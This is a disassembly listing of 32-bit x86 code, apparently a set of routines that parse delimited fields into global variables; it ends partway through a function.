  405c5d:	23 45 cc             	and    -0x34(%ebp),%eax
  405c60:	bf 00 20 00 00       	mov    $0x2000,%edi
  405c65:	57                   	push   %edi
  405c66:	a3 e0 50 41 00       	mov    %eax,0x4150e0
  405c6b:	e8 12 0d 00 00       	call   0x406982
  405c70:	83 c4 18             	add    $0x18,%esp
  405c73:	8b c7                	mov    %edi,%eax
  405c75:	eb 02                	jmp    0x405c79
  405c77:	33 c0                	xor    %eax,%eax
  405c79:	5f                   	pop    %edi
  405c7a:	5e                   	pop    %esi
  405c7b:	5b                   	pop    %ebx
  405c7c:	c9                   	leave
  405c7d:	c3                   	ret
  405c7e:	55                   	push   %ebp
  405c7f:	8b ec                	mov    %esp,%ebp
  405c81:	81 ec d0 01 00 00    	sub    $0x1d0,%esp
  405c87:	83 65 fc 00          	andl   $0x0,-0x4(%ebp)
  405c8b:	53                   	push   %ebx
  405c8c:	56                   	push   %esi
  405c8d:	57                   	push   %edi
  405c8e:	8d 4d fc             	lea    -0x4(%ebp),%ecx
  405c91:	51                   	push   %ecx
  405c92:	6a 22                	push   $0x22
  405c94:	6a 5e                	push   $0x5e
  405c96:	5e                   	pop    %esi
  405c97:	56                   	push   %esi
  405c98:	8d 4d c0             	lea    -0x40(%ebp),%ecx
  405c9b:	83 c0 12             	add    $0x12,%eax
  405c9e:	51                   	push   %ecx
  405c9f:	50                   	push   %eax
  405ca0:	89 45 f8             	mov    %eax,-0x8(%ebp)
  405ca3:	c7 45 e8 05 00 00 00 	movl   $0x5,-0x18(%ebp)
  405caa:	c7 45 f0 01 00 00 00 	movl   $0x1,-0x10(%ebp)
  405cb1:	e8 45 fc ff ff       	call   0x4058fb
  405cb6:	83 c4 14             	add    $0x14,%esp
  405cb9:	85 c0                	test   %eax,%eax
  405cbb:	74 25                	je     0x405ce2
  405cbd:	83 7d fc 02          	cmpl   $0x2,-0x4(%ebp)
  405cc1:	75 1f                	jne    0x405ce2
  405cc3:	8b 45 c0             	mov    -0x40(%ebp),%eax
  405cc6:	85 c0                	test   %eax,%eax
  405cc8:	74 18                	je     0x405ce2
  405cca:	89 45 e8             	mov    %eax,-0x18(%ebp)
  405ccd:	8b 45 c4             	mov    -0x3c(%ebp),%eax
  405cd0:	83 f8 09             	cmp    $0x9,%eax
  405cd3:	89 45 f0             	mov    %eax,-0x10(%ebp)
  405cd6:	76 0a                	jbe    0x405ce2
  405cd8:	6a 0a                	push   $0xa
  405cda:	33 d2                	xor    %edx,%edx
  405cdc:	59                   	pop    %ecx
  405cdd:	f7 f1                	div    %ecx
  405cdf:	89 55 f0             	mov    %edx,-0x10(%ebp)
  405ce2:	8b 45 f8             	mov    -0x8(%ebp),%eax
  405ce5:	83 25 28 04 42 00 00 	andl   $0x0,0x420428
  405cec:	68 28 04 42 00       	push   $0x420428
  405cf1:	56                   	push   %esi
  405cf2:	68 78 76 41 00       	push   $0x417678
  405cf7:	6a 27                	push   $0x27
  405cf9:	5b                   	pop    %ebx
  405cfa:	66 8b fb             	mov    %bx,%di
  405cfd:	e8 69 fb ff ff       	call   0x40586b
  405d02:	83 c4 0c             	add    $0xc,%esp
  405d05:	85 c0                	test   %eax,%eax
  405d07:	0f 84 ac 02 00 00    	je     0x405fb9
  405d0d:	68 20 3d 42 00       	push   $0x423d20
  405d12:	53                   	push   %ebx
  405d13:	56                   	push   %esi
  405d14:	68 f8 29 42 00       	push   $0x4229f8
  405d19:	50                   	push   %eax
  405d1a:	e8 dc fb ff ff       	call   0x4058fb
  405d1f:	83 c4 14             	add    $0x14,%esp
  405d22:	85 c0                	test   %eax,%eax
  405d24:	0f 84 8f 02 00 00    	je     0x405fb9
  405d2a:	68 2c 04 42 00       	push   $0x42042c
  405d2f:	56                   	push   %esi
  405d30:	68 68 28 42 00       	push   $0x422868
  405d35:	e8 31 fb ff ff       	call   0x40586b
  405d3a:	83 c4 0c             	add    $0xc,%esp
  405d3d:	85 c0                	test   %eax,%eax
  405d3f:	0f 84 74 02 00 00    	je     0x405fb9
  405d45:	68 ec 2e 42 00       	push   $0x422eec
  405d4a:	56                   	push   %esi
  405d4b:	68 80 52 41 00       	push   $0x415280
  405d50:	e8 16 fb ff ff       	call   0x40586b
  405d55:	83 c4 0c             	add    $0xc,%esp
  405d58:	85 c0                	test   %eax,%eax
  405d5a:	0f 84 59 02 00 00    	je     0x405fb9
  405d60:	68 20 3d 42 00       	push   $0x423d20
  405d65:	53                   	push   %ebx
  405d66:	56                   	push   %esi
  405d67:	68 f0 2e 42 00       	push   $0x422ef0
  405d6c:	50                   	push   %eax
  405d6d:	e8 89 fb ff ff       	call   0x4058fb
  405d72:	83 c4 14             	add    $0x14,%esp
  405d75:	85 c0                	test   %eax,%eax
  405d77:	0f 84 3c 02 00 00    	je     0x405fb9
  405d7d:	8d 4d fc             	lea    -0x4(%ebp),%ecx
  405d80:	51                   	push   %ecx
  405d81:	53                   	push   %ebx
  405d82:	56                   	push   %esi
  405d83:	68 98 9f 41 00       	push   $0x419f98
  405d88:	50                   	push   %eax
  405d89:	e8 6d fb ff ff       	call   0x4058fb
  405d8e:	83 c4 14             	add    $0x14,%esp
  405d91:	85 c0                	test   %eax,%eax
  405d93:	0f 84 20 02 00 00    	je     0x405fb9
  405d99:	8d 4d fc             	lea    -0x4(%ebp),%ecx
  405d9c:	51                   	push   %ecx
  405d9d:	53                   	push   %ebx
  405d9e:	56                   	push   %esi
  405d9f:	68 20 fc 41 00       	push   $0x41fc20
  405da4:	50                   	push   %eax
  405da5:	e8 51 fb ff ff       	call   0x4058fb
  405daa:	83 c4 14             	add    $0x14,%esp
  405dad:	85 c0                	test   %eax,%eax
  405daf:	0f 84 04 02 00 00    	je     0x405fb9
  405db5:	8d 4d fc             	lea    -0x4(%ebp),%ecx
  405db8:	51                   	push   %ecx
  405db9:	56                   	push   %esi
  405dba:	68 ac f5 41 00       	push   $0x41f5ac
  405dbf:	e8 a7 fa ff ff       	call   0x40586b
  405dc4:	83 c4 0c             	add    $0xc,%esp
  405dc7:	85 c0                	test   %eax,%eax
  405dc9:	0f 84 ea 01 00 00    	je     0x405fb9
  405dcf:	83 7d fc 02          	cmpl   $0x2,-0x4(%ebp)
  405dd3:	0f 8c e0 01 00 00    	jl     0x405fb9
  405dd9:	68 54 f5 41 00       	push   $0x41f554
  405dde:	53                   	push   %ebx
  405ddf:	56                   	push   %esi
  405de0:	68 d4 3d 42 00       	push   $0x423dd4
  405de5:	50                   	push   %eax
  405de6:	e8 10 fb ff ff       	call   0x4058fb
  405deb:	83 c4 14             	add    $0x14,%esp
  405dee:	85 c0                	test   %eax,%eax
  405df0:	0f 84 c3 01 00 00    	je     0x405fb9
  405df6:	8d 4d f8             	lea    -0x8(%ebp),%ecx
  405df9:	51                   	push   %ecx
  405dfa:	8d 4d c0             	lea    -0x40(%ebp),%ecx
  405dfd:	56                   	push   %esi
  405dfe:	51                   	push   %ecx
  405dff:	e8 67 fa ff ff       	call   0x40586b
  405e04:	83 c4 0c             	add    $0xc,%esp
  405e07:	85 c0                	test   %eax,%eax
  405e09:	0f 84 aa 01 00 00    	je     0x405fb9
  405e0f:	8b 4d c0             	mov    -0x40(%ebp),%ecx
  405e12:	89 0d 74 76 41 00    	mov    %ecx,0x417674
  405e18:	8d 4d fc             	lea    -0x4(%ebp),%ecx
  405e1b:	51                   	push   %ecx
  405e1c:	56                   	push   %esi
  405e1d:	68 10 37 42 00       	push   $0x423710
  405e22:	e8 44 fa ff ff       	call   0x40586b
  405e27:	33 ff                	xor    %edi,%edi
  405e29:	83 c4 0c             	add    $0xc,%esp
  405e2c:	3b c7                	cmp    %edi,%eax
  405e2e:	0f 84 85 01 00 00    	je     0x405fb9
  405e34:	8d 4d fc             	lea    -0x4(%ebp),%ecx
  405e37:	51                   	push   %ecx
  405e38:	53                   	push   %ebx
  405e39:	56                   	push   %esi
  405e3a:	8d 4d c0             	lea    -0x40(%ebp),%ecx
  405e3d:	51                   	push   %ecx
  405e3e:	50                   	push   %eax
  405e3f:	e8 b7 fa ff ff       	call   0x4058fb
  405e44:	83 c4 14             	add    $0x14,%esp
  405e47:	3b c7                	cmp    %edi,%eax
  405e49:	0f 84 6a 01 00 00    	je     0x405fb9
  405e4f:	83 7d fc 03          	cmpl   $0x3,-0x4(%ebp)
  405e53:	0f 8c 60 01 00 00    	jl     0x405fb9
  405e59:	83 7d fc 04          	cmpl   $0x4,-0x4(%ebp)
  405e5d:	8b 4d c0             	mov    -0x40(%ebp),%ecx
  405e60:	89 0d b8 d0 41 00    	mov    %ecx,0x41d0b8
  405e66:	8b 4d c4             	mov    -0x3c(%ebp),%ecx
  405e69:	89 0d 24 9f 41 00    	mov    %ecx,0x419f24
  405e6f:	7e 0b                	jle    0x405e7c
  405e71:	8b 4d d0             	mov    -0x30(%ebp),%ecx
  405e74:	89 0d 7c 3d 42 00    	mov    %ecx,0x423d7c
  405e7a:	eb 06                	jmp    0x405e82
  405e7c:	89 3d 7c 3d 42 00    	mov    %edi,0x423d7c
  405e82:	39 7d c8             	cmp    %edi,-0x38(%ebp)
  405e85:	74 1d                	je     0x405ea4
  405e87:	68 20 3d 42 00       	push   $0x423d20
  405e8c:	53                   	push   %ebx
  405e8d:	56                   	push   %esi
  405e8e:	68 b0 37 42 00       	push   $0x4237b0
  405e93:	50                   	push   %eax
  405e94:	e8 62 fa ff ff       	call   0x4058fb
  405e99:	83 c4 14             	add    $0x14,%esp
  405e9c:	3b c7                	cmp    %edi,%eax
  405e9e:	0f 84 15 01 00 00    	je     0x405fb9
  405ea4:	39 7d cc             	cmp    %edi,-0x34(%ebp)
  405ea7:	74 7f                	je     0x405f28
  405ea9:	8d 4d f8             	lea    -0x8(%ebp),%ecx
  405eac:	51                   	push   %ecx
  405ead:	56                   	push   %esi
  405eae:	68 d8 f5 41 00       	push   $0x41f5d8
  405eb3:	66 8b fb             	mov    %bx,%di
  405eb6:	e8 b0 f9 ff ff       	call   0x40586b
  405ebb:	83 c4 0c             	add    $0xc,%esp
  405ebe:	85 c0                	test   %eax,%eax
  405ec0:	0f 84 f3 00 00 00    	je     0x405fb9
  405ec6:	8d 4d f8             	lea    -0x8(%ebp),%ecx
  405ec9:	51                   	push   %ecx
  405eca:	8d 8d 30 fe ff ff    	lea    -0x1d0(%ebp),%ecx
  405ed0:	56                   	push   %esi
  405ed1:	51                   	push   %ecx
  405ed2:	e8 94 f9 ff ff       	call   0x40586b
  405ed7:	83 c4 0c             	add    $0xc,%esp
  405eda:	85 c0                	test   %eax,%eax
  405edc:	0f 84 d7 00 00 00    	je     0x405fb9
  405ee2:	83 65 f4 00          	andl   $0x0,-0xc(%ebp)
  405ee6:	83 7d f8 00          	cmpl   $0x0,-0x8(%ebp)
  405eea:	7e 34                	jle    0x405f20
  405eec:	c7 45 ec e8 33 41 00 	movl   $0x4133e8,-0x14(%ebp)
  405ef3:	8d 45 fc             	lea    -0x4(%ebp),%eax
  405ef6:	50                   	push   %eax
  405ef7:	8b 45 f4             	mov    -0xc(%ebp),%eax
  405efa:	8b 84 85 30 fe ff ff 	mov    -0x1d0(%ebp,%eax,4),%eax
  405f01:	6a 3a                	push   $0x3a
  405f03:	ff 75 ec             	push   -0x14(%ebp)
  405f06:	66 33 ff             	xor    %di,%di
  405f09:	e8 5d f9 ff ff       	call   0x40586b
  405f0e:	83 45 ec 3c          	addl   $0x3c,-0x14(%ebp)
  405f12:	83 c4 0c             	add    $0xc,%esp
  405f15:	ff 45 f4             	incl   -0xc(%ebp)
  405f18:	8b 4d f4             	mov    -0xc(%ebp),%ecx
  405f1b:	3b 4d f8             	cmp    -0x8(%ebp),%ecx
  405f1e:	7c d3                	jl     0x405ef3
  405f20:	85 c0                	test   %eax,%eax
  405f22:	0f 84 91 00 00 00    	je     0x405fb9
  405f28:	68 d4 f5 41 00       	push   $0x41f5d4
  405f2d:	56                   	push   %esi
  405f2e:	68 e8 4c 41 00       	push   $0x414ce8
  405f33:	66 8b fb             	mov    %bx,%di
  405f36:	e8 30 f9 ff ff       	call   0x40586b
  405f3b:	83 c4 0c             	add    $0xc,%esp
  405f3e:	85 c0                	test   %eax,%eax
  405f40:	75 06                	jne    0x405f48
  405f42:	21 05 d4 f5 41 00    	and    %eax,0x41f5d4
  405f48:	8d 4d fc             	lea    -0x4(%ebp),%ecx
  405f4b:	51                   	push   %ecx
  405f4c:	53                   	push   %ebx
  405f4d:	56                   	push   %esi
  405f4e:	68 68 3a 42 00       	push   $0x423a68
  405f53:	50                   	push   %eax
  405f54:	e8 a2 f9 ff ff       	call   0x4058fb
  405f59:	83 c4 14             	add    $0x14,%esp
  405f5c:	85 c0                	test   %eax,%eax
  405f5e:	74 59                	je     0x405fb9
  405f60:	68 90 9f 41 00       	push   $0x419f90
  405f65:	56                   	push   %esi
  405f66:	68 40 06 42 00       	push   $0x420640
  405f6b:	66 8b fb             	mov    %bx,%di
  405f6e:	e8 f8 f8 ff ff       	call   0x40586b
  405f73:	83 c4 0c             	add    $0xc,%esp
  405f76:	85 c0                	test   %eax,%eax
  405f78:	75 06                	jne    0x405f80
  405f7a:	21 05 90 9f 41 00    	and    %eax,0x419f90
  405f80:	8d 4d fc             	lea    -0x4(%ebp),%ecx
  405f83:	51                   	push   %ecx
  405f84:	56                   	push   %esi
  405f85:	68 40 39 42 00       	push   $0x423940
  405f8a:	66 8b fb             	mov    %bx,%di
  405f8d:	e8 d9 f8 ff ff       	call   0x40586b
  405f92:	83 c4 0c             	add    $0xc,%esp
  405f95:	85 c0                	test   %eax,%eax
  405f97:	75 06                	jne    0x405f9f
  405f99:	21 05 90 9f 41 00    	and    %eax,0x419f90
  405f9f:	8b 75 f0             	mov    -0x10(%ebp),%esi
  405fa2:	68 3e 2d 40 00       	push   $0x402d3e
  405fa7:	ff 75 e8             	push   -0x18(%ebp)
  405faa:	6a 20                	push   $0x20
  405fac:	e8 d1 09 00 00       	call   0x406982
  405fb1:	83 c4 0c             	add    $0xc,%esp
  405fb4:	6a 20                	push   $0x20
  405fb6:	58                   	pop    %eax
  405fb7:	eb 02                	jmp    0x405fbb
  405fb9:	33 c0                	xor    %eax,%eax
  405fbb:	5f                   	pop    %edi
  405fbc:	5e                   	pop    %esi
  405fbd:	5b                   	pop    %ebx
  405fbe:	c9                   	leave
  405fbf:	c3                   	ret
  405fc0:	55                   	push   %ebp
  405fc1:	8b ec                	mov    %esp,%ebp
  405fc3:	83 ec 38             	sub    $0x38,%esp
  405fc6:	83 65 fc 00          	andl   $0x0,-0x4(%ebp)
  405fca:	53                   	push   %ebx
  405fcb:	56                   	push   %esi
  405fcc:	57                   	push   %edi
  405fcd:	8d 4d fc             	lea    -0x4(%ebp),%ecx
  405fd0:	51                   	push   %ecx
  405fd1:	6a 22                	push   $0x22
  405fd3:	6a 5e                	push   $0x5e
  405fd5:	5e                   	pop    %esi
  405fd6:	56                   	push   %esi
  405fd7:	8d 4d c8             	lea    -0x38(%ebp),%ecx
  405fda:	83 c0 12             	add    $0x12,%eax
  405fdd:	51                   	push   %ecx
  405fde:	50                   	push   %eax
  405fdf:	89 45 f0             	mov    %eax,-0x10(%ebp)
  405fe2:	c7 45 f4 05 00 00 00 	movl   $0x5,-0xc(%ebp)
  405fe9:	c7 45 f8 01 00 00 00 	movl   $0x1,-0x8(%ebp)
  405ff0:	e8 06 f9 ff ff       	call   0x4058fb
  405ff5:	83 c4 14             	add    $0x14,%esp
  405ff8:	85 c0                	test   %eax,%eax
  405ffa:	74 25                	je     0x406021
  405ffc:	83 7d fc 02          	cmpl   $0x2,-0x4(%ebp)
  406000:	75 1f                	jne    0x406021
  406002:	8b 45 c8             	mov    -0x38(%ebp),%eax
  406005:	85 c0                	test   %eax,%eax
  406007:	74 18                	je     0x406021
  406009:	89 45 f4             	mov    %eax,-0xc(%ebp)
  40600c:	8b 45 cc             	mov    -0x34(%ebp),%eax
  40600f:	83 f8 09             	cmp    $0x9,%eax
  406012:	89 45 f8             	mov    %eax,-0x8(%ebp)
  406015:	76 0a                	jbe    0x406021
  406017:	6a 0a                	push   $0xa
  406019:	33 d2                	xor    %edx,%edx
  40601b:	59                   	pop    %ecx
  40601c:	f7 f1                	div    %ecx
  40601e:	89 55 f8             	mov    %edx,-0x8(%ebp)
  406021:	8d 45 fc             	lea    -0x4(%ebp),%eax
  406024:	50                   	push   %eax
  406025:	8b 45 f0             	mov    -0x10(%ebp),%eax
  406028:	56                   	push   %esi
  406029:	bb 50 f0 41 00       	mov    $0x41f050,%ebx
  40602e:	53                   	push   %ebx
  40602f:	6a 27                	push   $0x27
  406031:	5f                   	pop    %edi
  406032:	e8 34 f8 ff ff       	call   0x40586b
  406037:	83 c4 0c             	add    $0xc,%esp
  40603a:	85 c0                	test   %eax,%eax
  40603c:	0f 84 d2 00 00 00    	je     0x406114
  406042:	83 7d fc 01          	cmpl   $0x1,-0x4(%ebp)
  406046:	0f 85 c8 00 00 00    	jne    0x406114
  40604c:	8b 0d 50 f0 41 00    	mov    0x41f050,%ecx
  406052:	83 25 dc fd 41 00 00 	andl   $0x0,0x41fddc
  406059:	68 dc fd 41 00       	push   $0x41fddc
  40605e:	56                   	push   %esi
  40605f:	53                   	push   %ebx
  406060:	89 0d e8 2e 42 00    	mov    %ecx,0x422ee8
  406066:	e8 00 f8 ff ff       	call   0x40586b
  40606b:	83 c4 0c             	add    $0xc,%esp
  40606e:	85 c0                	test   %eax,%eax
  406070:	0f 84 9e 00 00 00    	je     0x406114
  406076:	8d 4d fc             	lea    -0x4(%ebp),%ecx
  406079:	51                   	push   %ecx
  40607a:	57                   	push   %edi
  40607b:	56                   	push   %esi
  40607c:	68 58 32 41 00       	push   $0x413258
  406081:	50                   	push   %eax
  406082:	e8 74 f8 ff ff       	call   0x4058fb
  406087:	83 c4 14             	add    $0x14,%esp
  40608a:	85 c0                	test   %eax,%eax
  40608c:	0f 84 82 00 00 00    	je     0x406114
  406092:	8d 4d fc             	lea    -0x4(%ebp),%ecx
  406095:	51                   	push   %ecx
  406096:	56                   	push   %esi
  406097:	68 78 b1 41 00       	push   $0x41b178
  40609c:	e8 ca f7 ff ff       	call   0x40586b
  4060a1:	83 c4 0c             	add    $0xc,%esp
  4060a4:	85 c0                	test   %eax,%eax
  4060a6:	74 6c                	je     0x406114
  4060a8:	68 bc d0 41 00       	push   $0x41d0bc
  4060ad:	56                   	push   %esi
  4060ae:	68 98 02 42 00       	push   $0x420298
  4060b3:	e8 b3 f7 ff ff       	call   0x40586b
  4060b8:	83 c4 0c             	add    $0xc,%esp
  4060bb:	85 c0                	test   %eax,%eax
  4060bd:	74 55                	je     0x406114
  4060bf:	8d 4d fc             	lea    -0x4(%ebp),%ecx
  4060c2:	51                   	push   %ecx
  4060c3:	57                   	push   %edi
  4060c4:	56                   	push   %esi
  4060c5:	68 90 06 42 00       	push   $0x420690
  4060ca:	50                   	push   %eax
  4060cb:	e8 2b f8 ff ff       	call   0x4058fb
  4060d0:	83 c4 14             	add    $0x14,%esp
  4060d3:	85 c0                	test   %eax,%eax
  4060d5:	74 3d                	je     0x406114
  4060d7:	83 7d fc 02          	cmpl   $0x2,-0x4(%ebp)
  4060db:	7c 37                	jl     0x406114
  4060dd:	8d 4d f0             	lea    -0x10(%ebp),%ecx
  4060e0:	51                   	push   %ecx
  4060e1:	8d 4d c8             	lea    -0x38(%ebp),%ecx
  4060e4:	56                   	push   %esi
  4060e5:	51                   	push   %ecx
  4060e6:	e8 80 f7 ff ff       	call   0x40586b
  4060eb:	8b 75 f8             	mov    -0x8(%ebp),%esi
  4060ee:	f7 d8                	neg    %eax
  4060f0:	68 d5 2d 40 00       	push   $0x402dd5
  4060f5:	ff 75 f4             	push   -0xc(%ebp)
  4060f8:	1b c0                	sbb    %eax,%eax
  4060fa:	23 45 c8             	and    -0x38(%ebp),%eax
  4060fd:	bf 00 80 00 00       	mov    $0x8000,%edi
  406102:	57                   	push   %edi
  406103:	a3 48 a4 41 00       	mov    %eax,0x41a448
  406108:	e8 75 08 00 00       	call   0x406982
  40610d:	83 c4 18             	add    $0x18,%esp
  406110:	8b c7                	mov    %edi,%eax
  406112:	eb 02                	jmp    0x406116
  406114:	33 c0                	xor    %eax,%eax
  406116:	5f                   	pop    %edi
  406117:	5e                   	pop    %esi
  406118:	5b                   	pop    %ebx
  406119:	c9                   	leave
  40611a:	c3                   	ret
  40611b:	55                   	push   %ebp
  40611c:	8b ec                	mov    %esp,%ebp
  40611e:	83 ec 34             	sub    $0x34,%esp
  406121:	83 65 fc 00          	andl   $0x0,-0x4(%ebp)
  406125:	53                   	push   %ebx
  406126:	56                   	push   %esi
  406127:	57                   	push   %edi
  406128:	8b f0                	mov    %eax,%esi
  40612a:	8d 45 fc             	lea    -0x4(%ebp),%eax
  40612d:	50                   	push   %eax
  40612e:	6a 22                	push   $0x22
  406130:	6a 5e                	push   $0x5e
  406132:	5b                   	pop    %ebx
  406133:	53                   	push   %ebx
  406134:	8d 45 cc             	lea    -0x34(%ebp),%eax
  406137:	50                   	push   %eax
  406138:	83 c6 12             	add    $0x12,%esi
  40613b:	56                   	push   %esi
  40613c:	c7 45 f4 06 00 00 00 	movl   $0x6,-0xc(%ebp)
  406143:	c7 45 f8 01 00 00 00 	movl   $0x1,-0x8(%ebp)
  40614a:	e8 ac f7 ff ff       	call   0x4058fb
  40614f:	83 c4 14             	add    $0x14,%esp
  406152:	85 c0                	test   %eax,%eax
  406154:	74 25                	je     0x40617b
  406156:	83 7d fc 02          	cmpl   $0x2,-0x4(%ebp)
  40615a:	75 1f                	jne    0x40617b
  40615c:	8b 45 cc             	mov    -0x34(%ebp),%eax
  40615f:	85 c0                	test   %eax,%eax
  406161:	74 18                	je     0x40617b
  406163:	89 45 f4             	mov    %eax,-0xc(%ebp)
  406166:	8b 45 d0             	mov    -0x30(%ebp),%eax
  406169:	83 f8 09             	cmp    $0x9,%eax
  40616c:	89 45 f8             	mov    %eax,-0x8(%ebp)
  40616f:	76 0a                	jbe    0x40617b
  406171:	6a 0a                	push   $0xa
  406173:	33 d2                	xor    %edx,%edx
  406175:	59                   	pop    %ecx
  406176:	f7 f1                	div    %ecx
  406178:	89 55 f8             	mov    %edx,-0x8(%ebp)
  40617b:	8d 45 fc             	lea    -0x4(%ebp),%eax
  40617e:	50                   	push   %eax
  40617f:	53                   	push   %ebx
  406180:	8d 45 cc             	lea    -0x34(%ebp),%eax
  406183:	50                   	push   %eax
  406184:	6a 27                	push   $0x27
  406186:	5f                   	pop    %edi
  406187:	8b c6                	mov    %esi,%eax
  406189:	e8 dd f6 ff ff       	call   0x40586b
  40618e:	83 c4 0c             	add    $0xc,%esp
  406191:	85 c0                	test   %eax,%eax
  406193:	0f 84 b7 00 00 00    	je     0x406250
  406199:	83 7d fc 02          	cmpl   $0x2,-0x4(%ebp)
  40619d:	0f 8c ad 00 00 00    	jl     0x406250
  4061a3:	8b 4d cc             	mov    -0x34(%ebp),%ecx
  4061a6:	83 25 18 fc 41 00 00 	andl   $0x0,0x41fc18
  4061ad:	68 18 fc 41 00       	push   $0x41fc18
  4061b2:	89 0d 04 3c 42 00    	mov    %ecx,0x423c04
  4061b8:	8b 4d d0             	mov    -0x30(%ebp),%ecx
  4061bb:	53                   	push   %ebx
  4061bc:	68 d8 4d 41 00       	push   $0x414dd8
  4061c1:	89 0d a0 a4 41 00    	mov    %ecx,0x41a4a0
  4061c7:	e8 9f f6 ff ff       	call   0x40586b
  4061cc:	83 c4 0c             	add    $0xc,%esp
  4061cf:	85 c0                	test   %eax,%eax
  4061d1:	74 7d                	je     0x406250
  4061d3:	8d 4d fc             	lea    -0x4(%ebp),%ecx
  4061d6:	51                   	push   %ecx
  4061d7:	57                   	push   %edi
  4061d8:	53                   	push   %ebx
  4061d9:	68 a8 06 42 00       	push   $0x4206a8
  4061de:	50                   	push   %eax
  4061df:	e8 17 f7 ff ff       	call   0x4058fb
  4061e4:	83 c4 14             	add    $0x14,%esp
  4061e7:	85 c0                	test   %eax,%eax
  4061e9:	74 65                	je     0x406250
  4061eb:	8d 4d fc             	lea    -0x4(%ebp),%ecx
  4061ee:	51                   	push   %ecx
  4061ef:	53                   	push   %ebx
  4061f0:	68 58 04 42 00       	push   $0x420458
  4061f5:	e8 71 f6 ff ff       	call   0x40586b
  4061fa:	83 c4 0c             	add    $0xc,%esp
  4061fd:	85 c0                	test   %eax,%eax
  4061ff:	74 4f                	je     0x406250
  406201:	8d 4d fc             	lea    -0x4(%ebp),%ecx
  406204:	51                   	push   %ecx
  406205:	57                   	push   %edi
  406206:	53                   	push   %ebx
  406207:	68 08 78 41 00       	push   $0x417808
  40620c:	50                   	push   %eax
  40620d:	e8 e9 f6 ff ff       	call   0x4058fb
  406212:	83 c4 14             	add    $0x14,%esp
  406215:	85 c0                	test   %eax,%eax
  406217:	74 37                	je     0x406250
  406219:	8d 4d fc             	lea    -0x4(%ebp),%ecx
  40621c:	51                   	push   %ecx
  40621d:	8d 4d cc             	lea    -0x34(%ebp),%ecx
  406220:	53                   	push   %ebx
  406221:	51                   	push   %ecx
  406222:	e8 44 f6 ff ff       	call   0x40586b
  406227:	8b 75 f8             	mov    -0x8(%ebp),%esi
  40622a:	f7 d8                	neg    %eax
  40622c:	68 ad 2c 40 00       	push   $0x402cad
  406231:	ff 75 f4             	push   -0xc(%ebp)
  406234:	1b c0                	sbb    %eax,%eax
  406236:	23 45 cc             	and    -0x34(%ebp),%eax
  406239:	bf 00 10 00 00       	mov    $0x1000,%edi
  40623e:	57                   	push   %edi
  40623f:	a3 3c 08 42 00       	mov    %eax,0x42083c
  406244:	e8 39 07 00 00       	call   0x406982
  406249:	83 c4 18             	add    $0x18,%esp
  40624c:	8b c7                	mov    %edi,%eax
  40624e:	eb 02                	jmp    0x406252
  406250:	33 c0                	xor    %eax,%eax
  406252:	5f                   	pop    %edi
  406253:	5e                   	pop    %esi
  406254:	5b                   	pop    %ebx
  406255:	c9                   	leave
  406256:	c3                   	ret
  406257:	55                   	push   %ebp
  406258:	8b ec                	mov    %esp,%ebp
  40625a:	83 ec 34             	sub    $0x34,%esp
  40625d:	83 65 fc 00          	andl   $0x0,-0x4(%ebp)
  406261:	83 65 f8 00          	andl   $0x0,-0x8(%ebp)
  406265:	53                   	push   %ebx
  406266:	56                   	push   %esi
  406267:	57                   	push   %edi
  406268:	8b f0                	mov    %eax,%esi
  40626a:	8d 45 fc             	lea    -0x4(%ebp),%eax
  40626d:	50                   	push   %eax
  40626e:	6a 22                	push   $0x22
  406270:	6a 5e                	push   $0x5e
  406272:	5b                   	pop    %ebx
  406273:	53                   	push   %ebx
  406274:	8d 45 cc             	lea    -0x34(%ebp),%eax
  406277:	50                   	push   %eax
  406278:	83 c6 12             	add    $0x12,%esi
  40627b:	56                   	push   %esi
  40627c:	c7 45 f4 06 00 00 00 	movl   $0x6,-0xc(%ebp)
  406283:	e8 73 f6 ff ff       	call   0x4058fb
  406288:	83 c4 14             	add    $0x14,%esp
  40628b:	85 c0                	test   %eax,%eax
  40628d:	74 25                	je     0x4062b4
  40628f:	83 7d fc 02          	cmpl   $0x2,-0x4(%ebp)
  406293:	75 1f                	jne    0x4062b4
  406295:	8b 45 cc             	mov    -0x34(%ebp),%eax
  406298:	85 c0                	test   %eax,%eax
  40629a:	74 18                	je     0x4062b4
  40629c:	89 45 f4             	mov    %eax,-0xc(%ebp)
  40629f:	8b 45 d0             	mov    -0x30(%ebp),%eax
  4062a2:	83 f8 09             	cmp    $0x9,%eax
  4062a5:	89 45 f8             	mov    %eax,-0x8(%ebp)
  4062a8:	76 0a                	jbe    0x4062b4
  4062aa:	6a 0a                	push   $0xa
  4062ac:	33 d2                	xor    %edx,%edx
  4062ae:	59                   	pop    %ecx
  4062af:	f7 f1                	div    %ecx
  4062b1:	89 55 f8             	mov    %edx,-0x8(%ebp)
  4062b4:	8d 45 fc             	lea    -0x4(%ebp),%eax
  4062b7:	50                   	push   %eax
  4062b8:	53                   	push   %ebx
  4062b9:	8d 45 cc             	lea    -0x34(%ebp),%eax
  4062bc:	50                   	push   %eax
  4062bd:	6a 27                	push   $0x27
  4062bf:	5f                   	pop    %edi
  4062c0:	8b c6                	mov    %esi,%eax
  4062c2:	e8 a4 f5 ff ff       	call   0x40586b
  4062c7:	83 c4 0c             	add    $0xc,%esp
  4062ca:	85 c0                	test   %eax,%eax
  4062cc:	0f 84 52 01 00 00    	je     0x406424
  4062d2:	83 7d fc 01          	cmpl   $0x1,-0x4(%ebp)
  4062d6:	0f 85 48 01 00 00    	jne    0x406424
  4062dc:	8b 4d cc             	mov    -0x34(%ebp),%ecx
  4062df:	68 50 f5 41 00       	push   $0x41f550
  4062e4:	53                   	push   %ebx
  4062e5:	68 68 f7 41 00       	push   $0x41f768
  4062ea:	89 0d 00 3c 42 00    	mov    %ecx,0x423c00
  4062f0:	e8 76 f5 ff ff       	call   0x40586b
  4062f5:	83 c4 0c             	add    $0xc,%esp
  4062f8:	85 c0                	test   %eax,%eax
  4062fa:	0f 84 24 01 00 00    	je     0x406424
  406300:	68 c4 2b 42 00       	push   $0x422bc4
  406305:	53                   	push   %ebx
  406306:	68 e8 fd 41 00       	push   $0x41fde8
  40630b:	e8 5b f5 ff ff       	call   0x40586b
  406310:	83 c4 0c             	add    $0xc,%esp
  406313:	85 c0                	test   %eax,%eax
  406315:	0f 84 09 01 00 00    	je     0x406424
  40631b:	68 e8 05 42 00       	push   $0x4205e8
  406320:	53                   	push   %ebx
  406321:	68 f0 05 42 00       	push   $0x4205f0
  406326:	e8 40 f5 ff ff       	call   0x40586b
  40632b:	83 c4 0c             	add    $0xc,%esp
  40632e:	85 c0                	test   %eax,%eax
  406330:	0f 84 ee 00 00 00    	je     0x406424
  406336:	68 78 3d 42 00       	push   $0x423d78
